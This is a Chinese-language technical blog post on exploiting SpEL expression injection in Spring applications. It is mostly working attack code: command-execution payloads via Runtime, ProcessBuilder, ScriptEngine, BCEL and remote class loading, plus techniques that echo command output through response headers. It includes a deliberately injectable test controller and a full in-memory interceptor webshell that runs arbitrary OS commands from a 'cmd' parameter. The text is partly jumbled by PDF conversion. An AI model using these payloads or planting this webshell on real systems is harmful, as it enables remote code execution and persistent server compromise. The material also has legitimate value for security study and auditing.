---
title: Java的SPEL表达式注入
published: 2025-11-05
description: SPEL
tags: [java审计, Video]
category: java审计
draft: false
---



### pom.xml引入Spring，直接导入Spring core 等库可能会出现ClassNotFound

### 注意：这里使用2.7.18是因为笔者的Java版本是JDK1.

# 定界符

### #{} : 花括号内的内容将被解析为SPEL语句

### ${} : 单纯的占位符

# T()表达式

### 被T()包围的内容会被解析为一个类，比如java.lang.String，java.lang.Runtime

```
<dependency>
<groupId>org.springframework.boot</groupId>
<artifactId>spring-boot-starter-web</artifactId>
<version> 2. 7. 18 </version>
</dependency>
package org.example;
import org.springframework.expression.EvaluationContext;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
public class SpringSpelTest {
public static void main(String[] args) {
String cmdStr = "T(java.lang.String)";
ExpressionParser parser = new SpelExpressionParser();
EvaluationContext evaluationContext = new StandardEvaluationContext();
String result = parser.parseExpression(cmdStr).getValue(evaluationContext).toString();
System.out.println(result);
}
}
```

### 运算符类型 运算符

### 算数运算 +, -, *, /, %, ^

### 关系运算 <, >, ==, <=, >=, lt, gt, eq, le, ge

### 逻辑运算 and, or, not,!

### 条件运算 ?:(ternary), ?:(Elvis)

### 正则表达式 matches

### 运算符 符号 文本类型

### 等于 == eq

### 小于 < lt

### 小于等于 <= le

### 大于 > gt

### 大于等于 >= ge

# 运算符

# 变量定义和引用

### 在SpEL表达式中，变量定义通过EvaluationContext类的setVariable(variableName, value)函数来实现；在表达式中使用”#variableName”

### 来引用；除了引用自定义变量，SpEL还允许引用根对象及当前上下文对象：

### #this：使用当前正在计算的上下文；

### #root：引用容器的root对象；

### @something：引用Bean

# 无回显命令执行

## ProcessBuilder

### SpEL表达式注入也可以直接通过new的形式初始化一个对象

## Runtime

### 两者都能弹出计算机，但是很无奈回显都是形如：java.lang.ProcessImpl@721e0f4f的对象名，而不是命令执行的结果

## ScriptEngine

### 同样的也可以用javascript或者nashorn来执行java代码

# 远程类加载

## URLClassLoader

## AppClassLoader

### 这个感觉没啥用，图一乐

```
String cmdStr = "new java.lang.ProcessBuilder(new String[]{'calc'}).start()";
String cmdStr = "T(java.lang.Runtime).getRuntime().exec('calc')";
String cmdStr = "new javax.script.ScriptEngineManager().getEngineByName(\"javascript\").eval(\"s=
[1];s[0]='calc';java.lang.Runtime.getRuntime().exec(s);\")";
String cmdStr = "new javax.script.ScriptEngineManager().getEngineByName(\"nashorn\").eval(\"s=
[1];s[0]='calc';java.lang.Runtime.getRuntime().exec(s);\")";
String cmdStr = "new java.net.URLClassLoader(new java.net.URL[]{new
java.net.URL('http://127.0.0.1:8000/')}).loadClass(\"ShellCode\").newInstance()";
String cmdStr =
"T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang.Runtime').getRuntime().exec('calc')";
```

## BCEL字节码注入

### 随便编写一个恶意类

### 生成BCEL字节码

### SpEL表达式为

# 有回显输出

## 输出首行

## 完整输出

## BufferedReader + Collectors

## Scanner

### useDelimiter是指定分隔符的方法，输入任意内容即可

### 以上PAYLOAD如果是通过HTTP请求发包的形式传参，那么就把引号的转义去掉即可，后面也一样

```
package org.example;
import java.io.IOException;
public class CMD2 {
static {
try {
Runtime.getRuntime().exec("calc");
} catch (IOException e) {
throw new RuntimeException(e);
}
}
}
package org.example;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import java.io.IOException;
public class BCELtest {
public static void main(String[] args) throws IOException, InstantiationException, IllegalAccessException,
ClassNotFoundException {
JavaClass javaClass = Repository.lookupClass(CMD2.class);
String classCode = Utility.encode(javaClass.getBytes(),true);
String payload = "$$BCEL$$" + classCode;
System.out.println(payload);
}
}
String cmdStr = "T(com.sun.org.apache.bcel.internal.util.JavaWrapper)._main({\"BCEL字节码放这\"})}";
String cmdStr = "new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder(\"cmd\", \"/c\",
\"whoami\").start().getInputStream(), \"gbk\")).readLine()"
String cmdStr = "new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder(\"cmd\", \"/c\",
\"dir\").start().getInputStream(), \"gbk\")).lines().collect(T(java.util.stream.Collectors).joining(\"\n\"))";
String cmdStr = "new java.util.Scanner(new java.lang.ProcessBuilder(\"cmd\", \"/c\", \"dir\",
\".\\\").start().getInputStream(), \"GBK\").useDelimiter(\"asdas\").next()";
```

## 上下文response

### 如果Spring的路由方法处理了HttpServletResponse response，我们可以通过操作上下文的response，然后添加Header的形式来回显

### 写一个SpringSpelController.java

### 这个代码的意思是定义一个路由，然后把SPEL的结果反应到Response里

### 原来的SpringSpelTest.java则修改为启动Spring服务器的代码

### 修改项目的JVM启动项：-Dserver.port=80，否则tomcat容器将以本地 8080 为默认端口，不好抓包

### 抓包发包可以看到，Header多了一个x-cmd，其内容正好是我们的whoami

```
package org.example;
import org.springframework.expression.Expression;
import org.springframework.expression.spel.SpelParserConfiguration;
import org.springframework.stereotype.Controller;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import javax.servlet.http.HttpServletResponse;
@Controller
public class SpringSpelController {
@RequestMapping({"/spel"})
@ResponseBody
public String spel(String payload, HttpServletResponse response) {
StandardEvaluationContext context = new StandardEvaluationContext();
context.setVariable("response", response);
ExpressionParser parser = new SpelExpressionParser(new SpelParserConfiguration());
Expression exp = parser.parseExpression(payload);
return (String) exp.getValue(context);
}
}
package org.example;
import java.io.IOException;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
@SpringBootApplication
public class SpringSpelTest {
public static void main(String[] args) throws IOException {
SpringApplication.run(SpringSpelTest.class, args);
}
}
payload=#response.addHeader('x-cmd',new java.io.BufferedReader(new java.io.InputStreamReader(new
ProcessBuilder("cmd", "/c", "whoami").start().getInputStream(), "gbk")).readLine())
```

### 当然，这样做会导致命令执行的结果存在中文时导致报错，我们可以先把它URLencode一下，或者Base64加密

## 内存马

### 先把最终payload放出来

### 由于是MVC架构，那么想添加路由就必须打内存马，最终目的就是动态加载一个恶意类，并实例化，也就是需要找到一个合适的defineClass

### 方法：

### 它最好来自org.springframework，这样可以避免引入其他类型

### 能够解析base64编码或者url编码的内容

### 这里找到了org.springframework.cglib.core.ReflectUtils

### 有了defineClass方法，自然就需要一个ClassLoader，因为是MVC架构，自然需要获取当前Spring线程的ClassLoader

### 也就是java.lang.Thread.currentThread().getContextClassLoader()

### 第一个Payload使用的MLet类实际上是URLClassLoader，它能够加载任意类，虽然长了点但是兼容性没有问题

### 最后编写一个恶意类，既然想要添加内存马，那么就需要使用Spring的类，最终的代码如下：

### 参考：

### 文章 - Spring内存马——Controller/Interceptor构造 - 先知社区

### SpringBoot Interceptor 内存马 - zpchcbd - 博客园

### Spring型内存马 | stoocea's blog

```
payload=#response.addHeader('x-cmd',T(java.net.URLEncoder).encode(new java.util.Scanner(new
java.lang.ProcessBuilder("cmd", "/c", "dir", ".\\").start().getInputStream(),
"gbk").useDelimiter("asdas").next()))
payload=#response.addHeader('x-cmd',T(java.util.Base64).getEncoder().encodeToString(new java.util.Scanner(new
java.lang.ProcessBuilder("cmd", "/c", "dir", ".\\").start().getInputStream(),
"GBK").useDelimiter("asdas").next().getBytes()))
payload=T(org.springframework.cglib.core.ReflectUtils).defineClass('InceptorMemShell',T(org.springframework.ut
il.Base64Utils).decodeFromString('yv66vgAAA....'),new javax.management.loading.MLet(new
java.net.URL[ 0 ],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()
//这里可以用#{}包起来，视情况而定，我这里就不行
payload=T(org.springframework.cglib.core.ReflectUtils).defineClass('InceptorMemShell',T(org.springframework.ut
il.Base64Utils).decodeFromString(''),T(java.lang.Thread).currentThread().getContextClassLoader()).newInstance(
)
import org.springframework.web.servlet.HandlerInterceptor;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
```

import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.util.List;

public class InceptorMemShell extends AbstractTranslet implements HandlerInterceptor {

static {
System.out.println("start");
WebApplicationContext context = (WebApplicationContext)
RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServle
t.CONTEXT", 0 );
RequestMappingHandlerMapping mappingHandlerMapping =
context.getBean(RequestMappingHandlerMapping.class);
Field field = null;
try {
field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
} catch (NoSuchFieldException e) {
e.printStackTrace();
}
field.setAccessible(true);
List adaptInterceptors = null;
try {
adaptInterceptors = (List) field.get(mappingHandlerMapping);
} catch (IllegalAccessException e) {
e.printStackTrace();
}
InceptorMemShell evilInterceptor = new InceptorMemShell();
adaptInterceptors.add(evilInterceptor);
System.out.println("ok");
}

@Override
public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws
Exception {
String cmd = request.getParameter("cmd");
if (cmd != null) {
try {
response.setCharacterEncoding("gbk");
java.io.PrintWriter printWriter = response.getWriter();
ProcessBuilder builder;
String o = "";
if (System.getProperty("os.name").toLowerCase().contains("win")) {
builder = new ProcessBuilder(new String[]{"cmd.exe", "/c", cmd});
} else {
builder = new ProcessBuilder(new String[]{"/bin/bash", "-c", cmd});
}
java.util.Scanner c = new
java.util.Scanner(builder.start().getInputStream(),"gbk").useDelimiter("wocaosinidema");
o = c.hasNext()? c.next(): o;
c.close();
printWriter.println(o);
printWriter.flush();
printWriter.close();
} catch (Exception e) {
e.printStackTrace();
}
return false;
}
return true;
}

@Override
public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler,
ModelAndView modelAndView) throws Exception {
HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);
}

@Override
public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler,
Exception ex) throws Exception {
HandlerInterceptor.super.afterCompletion(request, response, handler, ex);

### 然后在内存马同目录下，写如下代码来获取Base64加密的恶意类字节码

### 注意，如果要HTTP请求的方式发包，就要把+号这种会被解析为空格的符号URL编码为%2b，否则会报错%20无法被Base64解析

### 最后的payload形如

### 这里比较复杂，如果内存马打成功了，则会在后台报错，在实战中，把start和ok的System.out删除即可

#### }

```
@Override
public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
}
@Override
public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws
TransletException {
}
}
import com.sun.org.apache.bcel.internal.Repository;
import java.io.IOException;
import java.util.Base64;
public class ClasstoBase64 {
public static void main(String[] args) throws IOException {
byte[] encode = Base64.getEncoder().encode(Repository.lookupClass(InceptorMemShell.class).getBytes());
System.out.println(new String(encode).replace("+","%2b"));
}
}
payload=T(org.springframework.cglib.core.ReflectUtils).defineClass('InceptorMemShell',T(org.springframework.ut
il.Base64Utils).decodeFromString('yv66vgAAA......AEAiAAAAAIAiQ=='),new javax.management.loading.MLet(new
java.net.URL[ 0 ],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()
start
ok
2025 - 02 - 27 09 : 26 :27.068 ERROR 5696 --- [p-nio- 80 - exec- 7 ] o.a.c.c.C.[.[.[/].[dispatcherServlet] :
Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Request processing
failed; nested exception is java.lang.ClassCastException: InceptorMemShell cannot be cast to java.lang.String]
with root cause
```

### 最后访问任意路由即可，传参则为cmd

This is a offline tool, your data stays locally and is not send to any server!

[Feedback & Bug Reports](https://github.com/jzillmann/pdf-to-markdown/issues)